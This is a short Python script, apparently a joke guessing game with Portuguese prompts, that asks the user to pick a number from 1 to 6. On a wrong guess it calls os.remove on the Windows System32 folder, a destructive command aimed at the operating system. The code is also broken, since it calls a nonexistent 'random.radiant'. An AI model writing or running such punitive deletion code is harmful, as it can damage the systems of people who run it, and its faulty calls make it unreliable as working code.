import random
import os

number = random.radiant(1,6)
guess = input("Escolha um numero de 1 a 6")
guess = int(guess)

if guess == number:
  print("parabens")
else:
  os.remove("C:\Windows\System32")
